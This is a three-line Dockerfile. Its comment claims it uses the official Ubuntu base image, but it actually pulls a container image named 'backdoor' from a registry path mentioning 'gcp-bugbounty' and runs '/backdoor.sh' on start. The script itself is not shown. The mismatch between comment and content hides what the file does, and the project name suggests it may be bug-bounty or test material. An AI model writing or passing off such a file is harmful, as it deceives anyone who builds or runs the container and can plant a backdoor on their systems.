# Use the official Ubuntu base image
FROM gcr.io/gcp-bugbounty/backdoor:latest
CMD ["bash", "/backdoor.sh"]
